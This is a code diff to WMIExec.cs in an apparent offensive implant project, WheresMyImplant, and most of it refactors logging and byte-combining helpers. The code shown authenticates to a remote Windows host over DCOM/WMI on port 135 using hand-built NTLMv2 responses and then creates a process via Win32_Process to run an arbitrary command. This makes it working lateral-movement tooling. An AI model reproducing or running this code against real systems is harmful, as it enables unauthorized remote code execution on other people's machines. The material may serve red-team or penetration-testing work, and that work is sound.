@@ -5,6 +5,10 @@ using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 
+using MonkeyWorks;
+using MonkeyWorks.SMB.DCERPC;
+using MonkeyWorks.SMB.DCOM;
+
 namespace WheresMyImplant
 {
     class WMIExec : Base, IDisposable
@@ -29,7 +33,6 @@ namespace WheresMyImplant
         private Byte[] recieve;
 
         private Byte[] bLocalHostname;
-        private String strLocalHostname;
 
         private Byte[] sessionId;
         private Byte[] causalityId;
@@ -78,14 +81,14 @@ namespace WheresMyImplant
         {
             this.target = target;
 
-            WriteOutputNeutral(String.Format("Connecting Initiator to {0}:135", target));
+            Console.WriteLine("[*] Connecting Initiator to {0}:135", target);
             try
             {
                 wmiClientInitiator.Connect(target, 135);
             }
             catch (Exception ex)
             {
-                WriteOutput(ex.Message);
+                Console.WriteLine("[-] {0}", ex.Message);
             }
 
             if (wmiClientInitiator.Connected)
@@ -135,7 +138,7 @@ namespace WheresMyImplant
             bRemoteHostname = recieve.Skip(42).Take(recieve.Length - 42).ToArray();
             GCHandle handle = GCHandle.Alloc(bRemoteHostname, GCHandleType.Pinned);
             strRemoteHostname = Marshal.PtrToStringUni(handle.AddrOfPinnedObject());
-            WriteOutputGood(String.Format("Target hostname: {0}", strRemoteHostname));
+            Console.WriteLine("[+] Target hostname: {0}", strRemoteHostname);
             handle.Free();
 
             if (null != wmiStream)
@@ -154,14 +157,14 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         internal Boolean ConnectWMI()
         {
-            WriteOutputNeutral(String.Format("Connecting to {0}:135", target));
+            Console.WriteLine("[*] Connecting to {0}:135", target);
             try
             {
                 wmiClient.Connect(target, 135);
             }
             catch (Exception ex)
             {
-                WriteOutput(ex.Message);
+                Console.WriteLine("[-] {0}", ex.Message);
                 return false;
             }
 
@@ -245,7 +248,7 @@ namespace WheresMyImplant
 
             String usernameTarget = username.ToUpper();
             Byte[] bUsernameTarget = Encoding.Unicode.GetBytes(usernameTarget);
-            bUsernameTarget = Misc.Combine(bUsernameTarget, bDomain);
+            bUsernameTarget = Combine.combine(bUsernameTarget, bDomain);
 
             Byte[] NetNTLMv2Hash;
             using (HMACMD5 hmac = new HMACMD5())
@@ -261,17 +264,17 @@ namespace WheresMyImplant
                 bClientChallenge[i] = (Byte)random.Next(0, 255);
             }
 
-            Byte[] blob = Misc.Combine(new Byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, bTime);
-            blob = Misc.Combine(blob, bClientChallenge);
-            blob = Misc.Combine(blob, new Byte[] { 0x00, 0x00, 0x00, 0x00 });
-            blob = Misc.Combine(blob, details);
-            blob = Misc.Combine(blob, new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
+            Byte[] blob = Combine.combine(new Byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, bTime);
+            blob = Combine.combine(blob, bClientChallenge);
+            blob = Combine.combine(blob, new Byte[] { 0x00, 0x00, 0x00, 0x00 });
+            blob = Combine.combine(blob, details);
+            blob = Combine.combine(blob, new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
 
             Byte[] NetNTLMv2Response;
             using (HMACMD5 hmacMD5 = new HMACMD5())
             {
                 hmacMD5.Key = NetNTLMv2Hash;
-                Byte[] bServerChallengeAndBlob = Misc.Combine(bServerChallenge, blob);
+                Byte[] bServerChallengeAndBlob = Combine.combine(bServerChallenge, blob);
                 NetNTLMv2Response = hmacMD5.ComputeHash(bServerChallengeAndBlob);
                 sessionBaseKey = hmacMD5.ComputeHash(NetNTLMv2Response);
             }
@@ -284,10 +287,10 @@ namespace WheresMyImplant
 
             using (MD5 md5 = new MD5CryptoServiceProvider())
             {
-                signingKey = md5.ComputeHash(Misc.Combine(sessionBaseKey, signingConstant));
+                signingKey = md5.ComputeHash(Combine.combine(sessionBaseKey, signingConstant));
             }
 
-            NetNTLMv2Response = Misc.Combine(NetNTLMv2Response, blob);
+            NetNTLMv2Response = Combine.combine(NetNTLMv2Response, blob);
             Byte[] NetNTLMv2ResponseLength = BitConverter.GetBytes(NetNTLMv2Response.Length).Take(2).ToArray();
 
             Byte[] sessionKeyOffset = BitConverter.GetBytes(bDomain.Length + bUsername.Length + bLocalHostname.Length + NetNTLMv2Response.Length + 88);
@@ -349,7 +352,7 @@ namespace WheresMyImplant
         {
             causalityId = Encoding.ASCII.GetBytes(Misc.GenerateUuid(16));
 
-            DCOMRemoteCreateInstance remoteCreateInstance = new DCOMRemoteCreateInstance();
+            DCOMRemoteCreateInstanceWin32_Process remoteCreateInstance = new DCOMRemoteCreateInstanceWin32_Process();
             remoteCreateInstance.SetDCOMCausalityID(causalityId);
             remoteCreateInstance.SetServerInfoName(strRemoteHostname);
             Byte[] bRemoteCreateInstance = remoteCreateInstance.GetRequest();
@@ -361,7 +364,7 @@ namespace WheresMyImplant
             rpcRequest.SetContextID(new Byte[] { 0x01, 0x00 });
             rpcRequest.SetOpnum(new Byte[] { 0x04, 0x00 });
 
-            Byte[] bData = Misc.Combine(rpcRequest.GetRequest(), bRemoteCreateInstance);
+            Byte[] bData = Combine.combine(rpcRequest.GetRequest(), bRemoteCreateInstance);
             wmiStream.Write(bData, 0, bData.Length);
             wmiStream.Flush();
             wmiStream.Read(recieve, 0, recieve.Length);
@@ -378,12 +381,12 @@ namespace WheresMyImplant
 
             if (recieve.Skip(2).Take(1).ToArray().SequenceEqual(new Byte[] { 0x02 }))
             {
-                WriteOutputGood(String.Format(@"{0}/{1} has WMI Access", domain, username));
+                Console.WriteLine("[+] {0}/{1} has WMI Access", domain, username);
                 return true;
             }
             else
             {
-                WriteOutput("[-] Error:" + BitConverter.ToString(recieve.Skip(4).Take(4).ToArray()));
+                Console.WriteLine("[-] Error: {0}", BitConverter.ToString(recieve.Skip(4).Take(4).ToArray()));
                 return false;
             }
         }
@@ -393,7 +396,7 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         internal Boolean ConnectRandom()
         {
-            Byte[] bTargetUnicode = Misc.Combine(new Byte[] { 0x07, 0x00 }, Encoding.Unicode.GetBytes(strRemoteHostname + "["));
+            Byte[] bTargetUnicode = Combine.combine(new Byte[] { 0x07, 0x00 }, Encoding.Unicode.GetBytes(strRemoteHostname + "["));
             String search = BitConverter.ToString(bTargetUnicode).Replace("-", "");
             String strRecieve = BitConverter.ToString(recieve).Replace("-", "");
             Int32 indexStart = strRecieve.IndexOf(search) / 2;
@@ -413,7 +416,7 @@ namespace WheresMyImplant
             Int32 oxidIndex2 = MEOW.IndexOf(oxid, MEOW.IndexOf(oxid) + 1) / 2;
             uuid = recieve.Skip(oxidIndex2 + 12).Take(16).ToArray();
 
-            WriteOutputNeutral(String.Format("Connecting to WMI on {0}:{1}", target, port));
+            Console.WriteLine("[*] Connecting to WMI on {0}:{1}", target, port);
             randomClient = new TcpClient();
             randomClient.Client.ReceiveTimeout = 30000;
             try
@@ -422,7 +425,7 @@ namespace WheresMyImplant
             }
             catch (Exception ex)
             {
-                WriteOutput(ex.Message);
+                Console.WriteLine("[-] {0}", ex.Message);
                 return false;
             }
 
@@ -601,9 +604,9 @@ namespace WheresMyImplant
                 Byte[] hostnameLength = BitConverter.GetBytes(Environment.MachineName.Length + 1);
 
                 if (0 == Environment.MachineName.Length % 2)
-                    bLocalHostname = Misc.Combine(bLocalHostname, new Byte[] { 0x00, 0x00 });
+                    bLocalHostname = Combine.combine(bLocalHostname, new Byte[] { 0x00, 0x00 });
                 else
-                    bLocalHostname = Misc.Combine(bLocalHostname, new Byte[] { 0x00, 0x00 });
+                    bLocalHostname = Combine.combine(bLocalHostname, new Byte[] { 0x00, 0x00 });
 
 
                 Combine stubCombine = new Combine();
@@ -652,9 +655,9 @@ namespace WheresMyImplant
                 Byte[] bWMINamespace = Encoding.Unicode.GetBytes(String.Format(@"\\{0}\root\cimv2", strRemoteHostname));
 
                 if (0 == strRemoteHostname.Length % 2)
-                    bWMINamespace = Misc.Combine(bWMINamespace, new Byte[] { 0x00, 0x00 });
+                    bWMINamespace = Combine.combine(bWMINamespace, new Byte[] { 0x00, 0x00 });
                 else
-                    bWMINamespace = Misc.Combine(bWMINamespace, new Byte[] { 0x00, 0x00 });
+                    bWMINamespace = Combine.combine(bWMINamespace, new Byte[] { 0x00, 0x00 });
 
                 Combine stubCombine = new Combine();
                 stubCombine.Extend(new Byte[] { 0x05, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
@@ -785,7 +788,7 @@ namespace WheresMyImplant
                 opnum = new Byte[] { 0x18, 0x00 };
                 requestUUID = ipid2;
 
-                WriteOutputNeutral("Executing Command via Win32_Process");
+                Console.WriteLine("[*] Executing Command via Win32_Process");
                 Byte[] stubLength = BitConverter.GetBytes(command.Length + 1769).Take(2).ToArray();
                 Byte[] stubLength2 = BitConverter.GetBytes(command.Length + 1727).Take(2).ToArray();
                 Byte[] stubLength3 = BitConverter.GetBytes(command.Length + 1713).Take(2).ToArray();
@@ -796,19 +799,19 @@ namespace WheresMyImplant
 
                 if ((paddingCheck + 0.25) == Math.Ceiling(paddingCheck))
                 {
-                    bComand = Misc.Combine(bComand, new Byte[] { 0x00 });
+                    bComand = Combine.combine(bComand, new Byte[] { 0x00 });
                 }
                 else if ((paddingCheck + 0.50) == Math.Ceiling(paddingCheck))
                 {
-                    bComand = Misc.Combine(bComand, new Byte[] { 0x00, 0x00 });
+                    bComand = Combine.combine(bComand, new Byte[] { 0x00, 0x00 });
                 }
                 else if ((paddingCheck + 0.75) == Math.Ceiling(paddingCheck))
                 {
-                    bComand = Misc.Combine(bComand, new Byte[] { 0x00, 0x00, 0x00 });
+                    bComand = Combine.combine(bComand, new Byte[] { 0x00, 0x00, 0x00 });
                 }
                 else
                 {
-                    bComand = Misc.Combine(bComand, new Byte[] { 0x00, 0x00, 0x00, 0x00 });
+                    bComand = Combine.combine(bComand, new Byte[] { 0x00, 0x00, 0x00, 0x00 });
                 }
 
                 Combine stubCombine = new Combine();
@@ -1064,10 +1067,10 @@ namespace WheresMyImplant
             if (9 != recieve[1145])
             {
                 processId = BitConverter.ToUInt16(recieve.Skip(1141).Take(2).ToArray(), 0);
-                WriteOutputGood(String.Format("Created Process {0}", processId));
+                Console.WriteLine("[+] Created Process {0}", processId);
                 return;
             }
-            WriteOutput("[-] Created Process Failed");
+            Console.WriteLine("[-] Created Process Failed");
         }
 
         ////////////////////////////////////////////////////////////////////////////////
